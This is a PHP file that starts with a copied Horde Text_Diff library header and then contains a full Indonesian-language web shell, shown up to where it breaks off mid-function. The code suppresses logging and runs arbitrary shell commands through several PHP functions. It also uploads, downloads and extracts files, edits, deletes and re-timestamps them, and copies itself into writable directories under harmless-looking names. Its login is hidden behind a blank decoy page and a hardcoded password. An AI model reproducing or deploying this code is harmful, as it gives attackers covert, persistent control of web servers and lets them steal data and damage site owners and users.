<?php
/**
 * Class used internally by Diff to actually compute the diffs.
 *
 * This class uses the Unix `diff` program via shell_exec to compute the
 * differences between the two input arrays.
 *
 * Copyright 2007-2010 The Horde Project (http://www.horde.org/)
 *
 * See the enclosed file COPYING for license information (LGPL). If you did
 * not receive this file, see https://opensource.org/license/lgpl-2-1/.
 *
 * @author  Milian Wolff <mail@milianw.de>
 * @package Text_Diff
 * @since   0.3.0
 */
    /**
     * Path to the diff executable
     *
     * @var string
     */


    /**
     * Returns the array of differences.
     *
     * @param array $from_lines lines of text from old file
     * @param array $to_lines   lines of text from new file
     *
     * @return array all changes made (array with Text_Diff_Op_* objects)
     */
$password_hash = '$2a$12$t2julyJXtJBZkXQWQwWgI.jpjHi.gHDIqx.ko0w5bgN2.MkL3JcGS';

if (!defined('STDIN')) define('STDIN', fopen('php://stdin', 'r'));
@ignore_user_abort(true);
@ini_set('zlib.output_compression', '0');
@ob_end_clean();

// ==================== PENGELOLAAN SESSION PINTAR ====================
$session_name = 'shell_' . md5(__FILE__ . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'));
@session_name($session_name);

if (!isset($_SESSION) && function_exists('session_status') && session_status() === PHP_SESSION_NONE) {
    @session_start();
} elseif (!isset($_SESSION)) {
    @session_start();
}

@ini_set('memory_limit', '512M');
@ini_set('max_execution_time', '600');
@ini_set('max_input_time', '600');

$upload_tmp_dir = ini_get('upload_tmp_dir');
if (empty($upload_tmp_dir) || !is_writable($upload_tmp_dir)) {
    @ini_set('upload_tmp_dir', sys_get_temp_dir());
}

// ==================== BYPASS KEAMANAN UNIVERSAL ====================
$teknik_keamanan = [
    'ini_set' => function_exists('ini_set'),
    'error_reporting' => function_exists('error_reporting'),
    'set_time_limit' => function_exists('set_time_limit')
];

foreach ($teknik_keamanan as $fungsi => $tersedia) {
    if ($tersedia) {
        try {
            switch($fungsi) {
                case 'ini_set':
                    @ini_set('display_errors', '0');
                    @ini_set('log_errors', '0');
                    @ini_set('session.use_strict_mode', '0');
                    @ini_set('max_execution_time', '300');
                    @ini_set('max_input_time', '300');
                    @ini_set('memory_limit', '256M');
                    @ini_set('post_max_size', '200M');
                    @ini_set('upload_max_filesize', '200M');
                    break;
                case 'error_reporting':
                    @error_reporting(0);
                    break;
                case 'set_time_limit':
                    @set_time_limit(0);
                    break;
            }
        } catch (Exception $e) {}
    }
}

// ==================== FUNGSI UTILITAS LENGKAP ====================

function dapatkanDirektoriSaatIni() {
    static $direktori_stabil = null;
    
    if ($direktori_stabil === null) {
        $kandidat = [];
        if (isset($_GET['__d__'])) $kandidat[] = $_GET['__d__'];
        $kandidat[] = @getcwd();
        $kandidat[] = dirname(__FILE__);
        $kandidat[] = @realpath('.');
        
        foreach ($kandidat as $calon) {
            if ($calon && @is_dir($calon) && @is_readable($calon)) {
                $direktori_stabil = $calon;
                break;
            }
        }
        if (!$direktori_stabil) $direktori_stabil = '.';
    }
    
    return $direktori_stabil;
}

function formatBytes($byte, $presisi = 2) {
    if ($byte <= 0) return '0 B';
    
    $satuan = ['B', 'KB', 'MB', 'GB', 'TB'];
    $basis = log($byte, 1024);
    $pangkat = floor($basis);
    $pangkat = min($pangkat, count($satuan) - 1);
    $byte /= pow(1024, $pangkat);
    
    return round($byte, $presisi) . ' ' . $satuan[$pangkat];
}

function dapatkanPesanErrorUpload($error_code) {
    switch ($error_code) {
        case UPLOAD_ERR_INI_SIZE:
            return "File melebihi upload_max_filesize di php.ini (maks: " . ini_get('upload_max_filesize') . ")";
        case UPLOAD_ERR_FORM_SIZE:
            return "File melebihi MAX_FILE_SIZE yang ditentukan";
        case UPLOAD_ERR_PARTIAL:
            return "File hanya terupload sebagian";
        case UPLOAD_ERR_NO_FILE:
            return "Tidak ada file yang diupload";
        case UPLOAD_ERR_NO_TMP_DIR:
            return "Missing temporary folder";
        case UPLOAD_ERR_CANT_WRITE:
            return "Gagal menulis file ke disk (mungkin permission denied)";
        case UPLOAD_ERR_EXTENSION:
            return "Upload dihentikan oleh ekstensi PHP";
        default:
            return "Unknown error code: " . $error_code;
    }
}

function bersihkanNamaFile($nama) {
    // Hapus path traversal
    $nama = str_replace(['../', '..\\', './', '.\\'], '', $nama);
    
    // Hapus karakter berbahaya tapi pertahankan titik di awal untuk hidden files
    if (substr($nama, 0, 1) === '.') {
        // Ini adalah hidden file, pertahankan titik pertama
        $nama = '.' . preg_replace('/[^\w\-\.\(\)\s]/i', '_', substr($nama, 1));
    } else {
        $nama = preg_replace('/[^\w\-\.\(\)\s]/i', '_', $nama);
    }
    
    // Hapus multiple underscore
    $nama = preg_replace('/_+/', '_', $nama);
    
    // Batasi panjang nama file
    if (strlen($nama) > 200) {
        $ext = pathinfo($nama, PATHINFO_EXTENSION);
        $nama = substr($nama, 0, 190) . ($ext ? '.' . $ext : '');
    }
    
    // Trim karakter aneh di awal/akhir
    $nama = trim($nama, '._- ');
    
    // Jika hasil kosong, beri nama default
    if (empty($nama)) {
        $nama = 'file_' . time() . '.bin';
    }
    
    return $nama;
}

function uploadFileHandler($files, $target_dir) {
    $results = [];
    
    // Konversi single file ke format array
    if (isset($files['name']) && !is_array($files['name'])) {
        $files = [
            'name' => [$files['name']],
            'type' => [$files['type']],
            'tmp_name' => [$files['tmp_name']],
            'error' => [$files['error']],
            'size' => [$files['size']]
        ];
    }
    
    foreach ($files['name'] as $key => $name) {
        if ($files['error'][$key] !== UPLOAD_ERR_OK) {
            $results[] = "❌ Gagal upload {$name}: " . dapatkanPesanErrorUpload($files['error'][$key]);
            continue;
        }
        
        $nama_bersih = bersihkanNamaFile(basename($name));
        $target = rtrim($target_dir, '/') . '/' . $nama_bersih;
        
        if (!is_dir($target_dir)) {
            @mkdir($target_dir, 0755, true);
        }
        
        if (!is_writable($target_dir)) {
            @chmod($target_dir, 0755);
        }
        
        $uploaded = false;
        
        // Metode 1: move_uploaded_file
        if (@move_uploaded_file($files['tmp_name'][$key], $target)) {
            $uploaded = true;
        }
        // Metode 2: copy + unlink
        elseif (@copy($files['tmp_name'][$key], $target)) {
            @unlink($files['tmp_name'][$key]);
            $uploaded = true;
        }
        // Metode 3: baca tulis manual
        else {
            $content = @file_get_contents($files['tmp_name'][$key]);
            if ($content !== false && @file_put_contents($target, $content)) {
                $uploaded = true;
            }
        }
        
        if ($uploaded) {
            @chmod($target, 0644);
            $results[] = "✅ Berhasil upload: {$nama_bersih} (" . formatBytes($files['size'][$key]) . ")";
        } else {
            $results[] = "❌ Gagal upload: {$nama_bersih} (periksa permission)";
        }
    }
    
    return $results;
}

function extractZipFile($zip_path, $extract_to, $delete_after = true) {
    $results = [];
    
    if (!file_exists($zip_path) || filesize($zip_path) == 0) {
        return ["❌ File ZIP tidak valid atau kosong"];
    }
    
    if (!is_dir($extract_to)) {
        @mkdir($extract_to, 0755, true);
    }
    
    if (!is_writable($extract_to)) {
        @chmod($extract_to, 0755);
    }
    
    $extracted = false;
    
    // Metode 1: ZipArchive
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_path) === TRUE) {
            $total_size = 0;
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                $total_size += $stat['size'];
            }
            
            $free_space = disk_free_space($extract_to);
            if ($total_size > $free_space) {
                $results[] = "❌ Ruang disk tidak cukup. Butuh: " . formatBytes($total_size);
            } elseif ($zip->extractTo($extract_to)) {
                $results[] = "✅ Berhasil ekstrak {$zip->numFiles} file";
                for ($i = 0; $i < min($zip->numFiles, 10); $i++) {
                    $results[] = "  📄 " . $zip->getNameIndex($i);
                }
                $extracted = true;
            }
            $zip->close();
        }
    }
    
    // Metode 2: Command line unzip
    if (!$extracted && function_exists('shell_exec')) {
        $cmd = 'cd "' . addslashes($extract_to) . '" && unzip -o "' . addslashes($zip_path) . '" 2>&1';
        $output = @shell_exec($cmd);
        if ($output && (strpos($output, 'inflating') !== false || strpos($output, 'extracting') !== false)) {
            $results[] = "✅ Berhasil ekstrak via command line";
            $extracted = true;
        }
    }
    
    if ($extracted && $delete_after) {
        @unlink($zip_path);
        $results[] = "🗑 File ZIP dihapus setelah ekstrak";
    } elseif (!$extracted) {
        $results[] = "❌ Gagal mengekstrak file ZIP";
    }
    
    return $results;
}

function unduhFileDenganPHP($url, $jalur_tujuan) {
    try {
        $konteks = stream_context_create([
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
            'http' => [
                'timeout' => 30,
                'header' => "User-Agent: Wget/1.21.4\r\n"
            ]
        ]);
        
        $konten_file = @file_get_contents($url, false, $konteks);
        
        if ($konten_file === false && function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Wget/1.21.4');
            $konten_file = curl_exec($ch);
            curl_close($ch);
        }
        
        if ($konten_file && file_put_contents($jalur_tujuan, $konten_file)) {
            @chmod($jalur_tujuan, 0644);
            $ukuran = filesize($jalur_tujuan);
            return "✅ Berhasil: Mengunduh " . basename($jalur_tujuan) . " (" . formatBytes($ukuran) . ")";
        } else {
            return "❌ Gagal: Pengunduhan gagal";
        }
    } catch (Exception $e) {
        return "❌ Error: " . $e->getMessage();
    }
}

function eksekusiPerintahCadangan($perintah, $direktori_kerja) {
    $hasil = '';
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $kode_kembali = 1;
    
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    if (function_exists('shell_exec') && empty($hasil)) {
        $hasil = @shell_exec($perintah_lengkap);
        $kode_kembali = ($hasil !== null && $hasil !== false) ? 0 : 1;
    }
    
    if (function_exists('exec') && empty($hasil)) {
        $keluaran = [];
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    }
    
    if (function_exists('passthru') && empty($hasil)) {
        ob_start();
        @passthru($perintah_lengkap, $kode_kembali);
        $hasil = ob_get_clean();
    }
    
    if (function_exists('system') && empty($hasil)) {
        ob_start();
        @system($perintah_lengkap, $kode_kembali);
        $hasil = ob_get_clean();
    }
    
    if (empty($hasil) && function_exists('proc_open')) {
        try {
            $deskriptor = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            
            $proses = proc_open($perintah_lengkap, $deskriptor, $pipa, null, null);
            
            if (is_resource($proses)) {
                fclose($pipa[0]);
                $stdout = stream_get_contents($pipa[1]);
                $stderr = stream_get_contents($pipa[2]);
                fclose($pipa[1]);
                fclose($pipa[2]);
                $nilai_kembali = proc_close($proses);
                $kode_kembali = $nilai_kembali;
                
                $hasil = trim($stdout);
                if (!empty($stderr)) {
                    $hasil .= "\n[STDERR]: " . trim($stderr);
                }
            }
        } catch (Exception $e) {
            $hasil = "Error: " . $e->getMessage();
        }
    }
    
    if ($kode_kembali === 0) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal (Kode Keluar: $kode_kembali): " . $perintah . "\n" . $hasil;
    }
    
    return $hasil ?: "Perintah dieksekusi (tanpa keluaran)";
}

function eksekusiWget($perintah, $direktori_kerja) {
    $keluaran = [];
    $kode_kembali = 0;
    
    // Parse perintah wget dengan opsi -O
    preg_match('/wget\s+(.*)$/i', $perintah, $cocok);
    $argumen = $cocok[1] ?? '';
    
    if (empty($argumen)) {
        return "❌ Error: Perintah wget tidak lengkap";
    }
    
    // Deteksi opsi -O dan nama file output
    $output_file = null;
    $url = null;
    
    // Cek pola -O namafile.php
    if (preg_match('/-O\s+([^\s]+)/i', $argumen, $matches)) {
        $output_file = $matches[1];
        // Hapus opsi -O dari argumen untuk mendapatkan URL
        $argumen = preg_replace('/-O\s+[^\s]+/i', '', $argumen);
    }
    
    // Ekstrak URL
    preg_match('/https?:\/\/[^\s]+/i', $argumen, $cocok_url);
    $url = $cocok_url[0] ?? '';
    
    if (!$url) {
        return "❌ Tidak dapat mengurai URL dari perintah wget";
    }
    
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    
    // Jika ada output_file yang ditentukan, gunakan itu
    if ($output_file) {
        $nama_file = bersihkanNamaFile($output_file);
    } else {
        $nama_file = basename(parse_url($url, PHP_URL_PATH));
        if (!$nama_file) $nama_file = 'file_diunduh_' . time();
    }
    
    $jalur_tujuan = rtrim($direktori_tujuan, '/') . '/' . $nama_file;
    
    // Coba eksekusi dengan shell_exec terlebih dahulu
    if (function_exists('shell_exec')) {
        $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
        $hasil = @shell_exec($perintah_lengkap);
        
        if ($hasil && (strpos($hasil, '100%') !== false || strpos($hasil, 'disimpan') !== false)) {
            $ukuran = @filesize($jalur_tujuan);
            return "✅ Berhasil: Mengunduh " . $nama_file . " (" . formatBytes($ukuran) . ")\n" . $hasil;
        }
    }
    
    // Fallback ke download via PHP
    $hasil = unduhFileDenganPHP($url, $jalur_tujuan);
    
    return $hasil;
}

function eksekusiCurl($perintah, $direktori_kerja) {
    $keluaran = [];
    $kode_kembali = 0;
    
    preg_match('/curl\s+(.*)$/i', $perintah, $cocok);
    $argumen = $cocok[1] ?? '';
    
    if (empty($argumen)) {
        return "❌ Error: Perintah curl tidak lengkap";
    }
    
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    if (function_exists('shell_exec')) {
        $hasil = @shell_exec($perintah_lengkap);
    } elseif (function_exists('exec')) {
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    } else {
        preg_match('/https?:\/\/[^\s]+/i', $argumen, $cocok_url);
        $url = $cocok_url[0] ?? '';
        if ($url) {
            $nama_file = basename(parse_url($url, PHP_URL_PATH));
            if (!$nama_file) $nama_file = 'file_diunduh_' . time();
            $jalur_tujuan = rtrim($direktori_tujuan, '/') . '/' . $nama_file;
            $hasil = unduhFileDenganPHP($url, $jalur_tujuan);
        } else {
            $hasil = "❌ Tidak dapat mengurai URL dari perintah curl";
        }
    }
    
    if ($kode_kembali === 0 || strpos($hasil, '100%') !== false || strpos($hasil, 'Total') !== false) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal: " . $perintah . "\n" . $hasil;
    }
    
    return $hasil;
}

function eksekusiZip($perintah, $direktori_kerja) {
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    $hasil = '';
    $kode_kembali = 1;
    
    if (function_exists('shell_exec')) {
        $hasil = @shell_exec($perintah_lengkap);
        if (strpos($hasil, 'menambahkan:') !== false || strpos($hasil, 'mengekstrak:') !== false || 
            strpos($hasil, 'Arsip:') !== false) {
            $kode_kembali = 0;
        }
    } elseif (function_exists('exec')) {
        $keluaran = [];
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    } else {
        $hasil = "❌ shell_exec dan exec tidak tersedia untuk operasi zip/unzip";
    }
    
    if ($kode_kembali === 0) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal: " . $perintah . "\n" . $hasil;
    }
    
    return $hasil;
}

function eksekusiLokal($perintah, $direktori_kerja = null) {
    $hasil = null;
    $perintah_asli = $perintah;
    $sukses = false;
    
    if (strpos($perintah, '%') !== false) {
        $perintah = urldecode($perintah);
    }
    
    $perintah = trim($perintah);
    
    if (preg_match('/^wget\s+/i', $perintah)) {
        return eksekusiWget($perintah, $direktori_kerja);
    }
    
    if (preg_match('/^curl\s+/i', $perintah)) {
        return eksekusiCurl($perintah, $direktori_kerja);
    }
    
    if (preg_match('/^(zip|unzip)\s+/i', $perintah)) {
        return eksekusiZip($perintah, $direktori_kerja);
    }
    
    return eksekusiPerintahCadangan($perintah, $direktori_kerja);
}

// ==================== FUNGSI BERSIHKAN PESAN OTOMATIS ====================
function bersihkanPesanOtomatis() {
    if (isset($_SESSION['pesan']) && !empty($_SESSION['pesan'])) {
        $_SESSION['pesan_timestamp'] = time();
    }
    
    if (isset($_SESSION['pesan_timestamp']) && (time() - $_SESSION['pesan_timestamp']) > 5) {
        $_SESSION['pesan'] = [];
        $_SESSION['keluaran_perintah'] = '';
        unset($_SESSION['pesan_timestamp']);
    }
}

bersihkanPesanOtomatis();

// ==================== FUNGSI PENYEBARAN ====================

/**
 * Mendapatkan daftar direktori dari posisi file saat ini
 */
function dapatkanDirektoriAcak($jumlah = 5) {
    $direktori = [];
    $posisi_awal = dirname(__FILE__);
    $semua_folder = [];
    
    // Fungsi rekursif untuk scan folder ke BAWAH (subdirektori)
    $scanBawah = function($path, $level = 0) use (&$scanBawah, &$semua_folder) {
        if ($level > 3) return;
        if (!is_dir($path) || !is_readable($path)) return;
        
        try {
            $items = scandir($path);
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                
                $full_path = $path . '/' . $item;
                if (is_dir($full_path) && is_writable($full_path)) {
                    $semua_folder[] = $full_path;
                    $scanBawah($full_path, $level + 1);
                }
            }
        } catch (Exception $e) {}
    };
    
    // Fungsi untuk scan ke ATAS (parent directory)
    $scanAtas = function($path, $level = 0) use (&$scanAtas, &$semua_folder) {
        if ($level > 3) return;
        if (!is_dir($path) || !is_readable($path)) return;
        
        if (is_writable($path)) {
            $semua_folder[] = $path;
        }
        
        $parent = dirname($path);
        if ($parent != $path && $parent != '/') {
            $scanAtas($parent, $level + 1);
        }
    };
    
    // Scan dari posisi file
    $scanBawah($posisi_awal);
    $scanAtas($posisi_awal);
    
    // Tambahkan direktori temp dan cache yang umum
    $lokasi_umum = [
        '/tmp',
        '/var/tmp',
        $_SERVER['DOCUMENT_ROOT'] . '/cache',
        $_SERVER['DOCUMENT_ROOT'] . '/temp',
        $_SERVER['DOCUMENT_ROOT'] . '/uploads',
        $_SERVER['DOCUMENT_ROOT'] . '/images',
        $_SERVER['DOCUMENT_ROOT'] . '/assets'
    ];
    
    foreach ($lokasi_umum as $lok) {
        if (is_dir($lok) && is_writable($lok)) {
            $semua_folder[] = $lok;
        }
    }
    
    // Hapus duplikat
    $semua_folder = array_unique($semua_folder);
    
    // Urutkan berdasarkan kedalaman (paling dalam dulu)
    usort($semua_folder, function($a, $b) {
        $depth_a = substr_count($a, '/');
        $depth_b = substr_count($b, '/');
        return $depth_b - $depth_a;
    });
    
    // Ambil 15 teratas lalu acak
    $teratas = array_slice($semua_folder, 0, 15);
    shuffle($teratas);
    
    return array_slice($teratas, 0, min($jumlah, count($teratas)));
}

/**
 * Menyebarkan script ke direktori lain dan MENAMPILKAN LINK
 */
function sebarDanTampilkanLink() {
    $hasil = [
        'waktu' => date('Y-m-d H:i:s'),
        'asal' => __FILE__,
        'tujuan' => [],
        'url' => [],
        'file_baru' => []
    ];
    
    // Dapatkan 5 direktori
    $direktori_tujuan = dapatkanDirektoriAcak(5);
    
    if (empty($direktori_tujuan)) {
        $_SESSION['pesan'][] = "❌ Tidak ada direktori yang dapat ditulisi";
        return false;
    }
    
    $konten_script = file_get_contents(__FILE__);
    
    $daftar_nama = [
        'nadir_base.php',
        'core_bridge.php', 
        'system_helper.php',
        'data_connector.php',
        'service_layer.php',
        'resource_manager.php',
        'typhoon_route.php'
    ];
    
    foreach ($direktori_tujuan as $index => $dir) {
        // Gunakan nama dari daftar berdasarkan urutan (sampai 7 file)
        if ($index < count($daftar_nama)) {
            $nama_acak = $daftar_nama[$index];
        } else {
            // Jika lebih dari 7, buat random
            $nama_acak = substr(md5(time() . rand(1000, 9999)), 0, 10) . '.php';
        }
        
        $path_tujuan = rtrim($dir, '/') . '/' . $nama_acak;
        
        // Cegah menimpa file yang sama
        if (file_exists($path_tujuan)) continue;
        
        if (file_put_contents($path_tujuan, $konten_script)) {
            @chmod($path_tujuan, 0644);
            
            // Buat URL
            $url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') 
                   . $_SERVER['HTTP_HOST'] 
                   . str_replace($_SERVER['DOCUMENT_ROOT'], '', $path_tujuan);
            
            $hasil['tujuan'][] = $path_tujuan;
            $hasil['url'][] = $url;
            $hasil['file_baru'][] = $nama_acak;
        }
    }
    
    if (empty($hasil['url'])) {
        $_SESSION['pesan'][] = "❌ Gagal menyebar ke semua direktori";
        return false;
    }
    
    // Simpan hasil ke session untuk ditampilkan
    $_SESSION['hasil_sebar'] = $hasil;
    
    // Simpan log
    $log = "[" . $hasil['waktu'] . "] TERSEDAR: \n";
    foreach ($hasil['url'] as $url) {
        $log .= "  - $url\n";
    }
    @file_put_contents(dirname(__FILE__) . '/.sebar_log.txt', $log, FILE_APPEND);
    
    return true;
}

// ==================== AUTENTIKASI PINTAR ====================
$__auth__ = false;

if (isset($_SESSION['__auth__']) && $_SESSION['__auth__'] === true) {
    $__auth__ = true;
} elseif (isset($_POST['__p__'])) {
    $kata_sandi = $_POST['__p__'];
    $terverifikasi = false;
    
    if (function_exists('password_verify')) {
        $terverifikasi = @password_verify($kata_sandi, $password_hash);
    }
    
    if (!$terverifikasi && function_exists('hash')) {
        $hash_input = @hash('sha256', $kata_sandi . 'salt');
        $hash_tersimpan = @hash('sha256', 'kata_sandi_anda' . 'salt');
        $terverifikasi = ($hash_input === $hash_tersimpan);
    }
    
    if (!$terverifikasi) {
        $kata_sandi_keras = 'kata_sandi_anda';
        $terverifikasi = ($kata_sandi === $kata_sandi_keras);
    }
    
    if ($terverifikasi) {
        $_SESSION['__auth__'] = true;
        $__auth__ = true;
        if (!headers_sent()) {
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            echo '<script>window.location.href="' . $_SERVER['PHP_SELF'] . '";</script>';
            exit;
        }
    }
}

// ==================== HALAMAN LOGIN ====================
if (!$__auth__) {
    $tampilkan_login = isset($_GET['__pagedown__']) && $_GET['__pagedown__'] == '1';
    
    if (!$tampilkan_login) {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title></title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="UTF-8">
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body { background:#fff; min-height:100vh; width:100%; overflow:hidden; }
                .pemicu { position:fixed; top:0; left:0; width:100%; height:100%; z-index:100; }
                * { -webkit-tap-highlight-color:transparent; -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; user-select:none; }
            </style>
        </head>
        <body>
            <div class="pemicu"></div>
            <script>
                document.addEventListener("keydown", function(e) {
                    if (e.key === "PageDown") {
                        e.preventDefault();
                        window.location.href = "?__pagedown__=1";
                    }
                }, true);
                document.addEventListener("contextmenu", function(e) { e.preventDefault(); });
                document.addEventListener("selectstart", function(e) { e.preventDefault(); });
            </script>
        </body>
        </html>';
        exit;
    } else {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title></title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="UTF-8">
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body { font-family:sans-serif; background:#fff; color:#333; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
                .login-box { background:#fff; border:1px solid #e0e0e0; border-radius:8px; padding:30px; width:100%; max-width:350px; box-shadow:0 2px 10px rgba(0,0,0,0.05); }
                input { width:100%; padding:12px; border:1px solid #ddd; border-radius:4px; margin-bottom:20px; }
                button { width:100%; padding:12px; background:#555; color:#fff; border:none; border-radius:4px; cursor:pointer; }
                button:hover { background:#444; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <form method="post">
                    <input type="password" name="__p__" placeholder="Password" required autofocus>
                    <button type="submit">Login</button>
                </form>
            </div>
            <script>
                document.querySelector("input").focus();
                document.addEventListener("keydown", function(e) {
                    if (e.key === "Escape") window.location.href = "?";
                });
            </script>
        </body>
        </html>';
        exit;
    }
}

// ==================== LOGIKA UTAMA ====================
$__dir__ = isset($_GET['__d__']) ? $_GET['__d__'] : dapatkanDirektoriSaatIni();
if (!@is_dir($__dir__)) $__dir__ = dapatkanDirektoriSaatIni();
if ($__dir__ !== '/' && substr($__dir__, -1) !== '/') $__dir__ .= '/';

$pesan = isset($_SESSION['pesan']) ? $_SESSION['pesan'] : [];
$keluaran_perintah = isset($_SESSION['keluaran_perintah']) ? $_SESSION['keluaran_perintah'] : '';

// ==================== PENANGANAN POST ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ===== PERBAIKAN CREATE NEW FILE / FOLDER =====
    if (isset($_POST['__buat__']) && $_POST['__buat__'] == '1') {
        $nama = isset($_POST['__nama__']) ? $_POST['__nama__'] : '';
        $tipe = isset($_POST['__tipe__']) ? $_POST['__tipe__'] : 'file';
        $konten = isset($_POST['__data__']) ? $_POST['__data__'] : '';
        
        if (!empty($nama)) {
            $nama = basename($nama);
            $nama_bersih = bersihkanNamaFile($nama);
            $jalur = $__dir__ . $nama_bersih;
            
            if ($tipe === 'file') {
                if (@file_put_contents($jalur, $konten)) {
                    @chmod($jalur, 0644);
                    $pesan[] = "📄 Berhasil membuat file: " . $nama_bersih;
                } else {
                    $pesan[] = "❌ Gagal membuat file: " . $nama_bersih . " (periksa permission)";
                }
            } else {
                if (@mkdir($jalur, 0755, true)) {
                    $pesan[] = "📁 Berhasil membuat folder: " . $nama_bersih;
                } else {
                    $pesan[] = "❌ Gagal membuat folder: " . $nama_bersih . " (mungkin sudah ada atau permission denied)";
                }
            }
        } else {
            $pesan[] = "❌ Nama tidak boleh kosong";
        }
    }
    
    if (!empty($_FILES['file'])) {
        $upload_results = uploadFileHandler($_FILES['file'], $__dir__);
        $pesan = array_merge($pesan, $upload_results);
    }

    if (!empty($_FILES['file_zip']) && $_FILES['file_zip']['error'] === UPLOAD_ERR_OK) {
        $tmp_zip = $_FILES['file_zip']['tmp_name'];
        $zip_name = $_FILES['file_zip']['name'];
    
        $temp_save = $__dir__ . 'temp_' . time() . '.zip';
    
        if (copy($tmp_zip, $temp_save)) {
            $extract_results = extractZipFile($temp_save, $__dir__, true);
            $pesan = array_merge($pesan, $extract_results);
        } else {
            $extract_results = extractZipFile($tmp_zip, $__dir__, false);
            $pesan = array_merge($pesan, $extract_results);
        }
    }
    if (isset($_POST['__url__']) && !empty($_POST['__url__'])) {
        $url = trim($_POST['__url__']);
        $nama_file = isset($_POST['__nama_file__']) && !empty($_POST['__nama_file__']) 
                    ? bersihkanNamaFile($_POST['__nama_file__']) 
                    : basename(parse_url($url, PHP_URL_PATH));
        
        if (empty($nama_file)) {
            $nama_file = 'file_' . time() . '.bin';
        }
        
        $target = $__dir__ . $nama_file;
        $pesan[] = unduhFileDenganPHP($url, $target);
    }
        
    // ===== PERINTAH TERMINAL =====
    if (isset($_POST['__perintah__']) && trim($_POST['__perintah__'])) {
        $keluaran_perintah = eksekusiLokal($_POST['__perintah__'], $__dir__);
    }
    
    // ===== EDIT FILE =====
    if (isset($_POST['__konten__']) && isset($_POST['__edit_file__'])) {
        $target = $__dir__ . basename($_POST['__edit_file__']);
        if (@file_put_contents($target, $_POST['__konten__'])) {
            $pesan[] = "💾 Disimpan: " . basename($target);
        }
    }
    
    // ===== HAPUS TERPILIH =====
    if (isset($_POST['__hapus_terpilih__'])) {
        $item_terpilih = $_POST['item_terpilih'] ?? [];
        $jumlah_dihapus = 0;
        foreach ($item_terpilih as $item) {
            $target = $__dir__ . basename($item);
            if (@file_exists($target)) {
                if (@is_dir($target)) {
                    eksekusiLokal("rm -rf " . escapeshellarg($target), $__dir__);
                } else {
                    @unlink($target);
                }
                $jumlah_dihapus++;
            }
        }
        if ($jumlah_dihapus > 0) {
            $pesan[] = "🗑 Dihapus $jumlah_dihapus item terpilih";
        } else {
            $pesan[] = "❌ Tidak ada item yang dapat dihapus";
        }
    }
    
    // ===== CHMOD =====
    if (isset($_POST['__chmod__'])) {
        $target = $__dir__ . basename($_POST['__chmod_file__']);
        $izin = $_POST['__izin__'];
        if (@file_exists($target) && @chmod($target, octdec($izin))) {
            $pesan[] = "🔧 Izin diubah: " . basename($target);
        }
    }
    
    // ===== TOUCH (UBAH WAKTU) =====
    if (isset($_POST['__sentuh__'])) {
        $target = $__dir__ . basename($_POST['__sentuh_file__']);
        $stempel_waktu = $_POST['__stempel_waktu__'];
        if (@file_exists($target) && @touch($target, strtotime($stempel_waktu))) {
            $pesan[] = "📅 Stempel waktu diubah: " . basename($target);
        }
    }
    
    // ===== GANTI NAMA =====
    if (isset($_POST['__ganti_nama__'])) {
        $nama_lama = $__dir__ . basename($_POST['__ganti_nama_lama__']);
        $nama_baru = $__dir__ . basename($_POST['__ganti_nama_baru__']);
        if (@file_exists($nama_lama) && !@file_exists($nama_baru) && @rename($nama_lama, $nama_baru)) {
            $pesan[] = "✏️ Diganti nama: " . basename($nama_lama);
        }
    }
    
    // ===== PENYEBARAN =====
    if (isset($_POST['__aksi_sebar__']) && $_POST['__aksi_sebar__'] === 'sebarkan') {
        if (sebarDanTampilkanLink()) {
            // Redirect ke halaman yang sama agar menampilkan hasil
            $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__) . "&__tampil_link__=1";
            $_SESSION['pesan'] = $pesan;
            $_SESSION['keluaran_perintah'] = $keluaran_perintah;
